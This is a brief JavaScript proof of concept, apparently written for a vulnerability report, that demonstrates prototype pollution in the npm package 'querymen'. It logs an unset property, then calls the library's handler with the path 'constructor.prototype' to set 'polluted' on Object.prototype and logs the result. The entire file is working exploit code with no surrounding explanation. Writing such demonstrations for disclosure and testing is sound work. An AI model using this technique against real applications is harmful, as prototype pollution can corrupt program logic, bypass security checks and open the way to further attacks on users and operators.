var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
var a = require('querymen');
obj = {};
console.log({}.polluted);
a.handler('constructor.prototype', 'polluted', 'yes');
console.log({}.polluted);